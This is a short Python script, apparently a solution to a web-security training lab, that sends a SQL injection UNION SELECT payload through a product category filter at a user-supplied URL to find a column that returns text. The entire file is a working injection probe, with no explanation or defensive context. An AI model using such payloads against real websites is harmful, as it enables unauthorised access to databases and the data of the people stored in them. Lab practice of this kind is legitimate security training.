#SQL injection UNION attack, finding a column containing text
import requests
import time
url = input("enter url : ")
path="/filter?category=Accessories"
string="y441Ee"
r=requests.get(url+path+"'+UNION+SELECT+NULL,'"+string+"',NULL--")
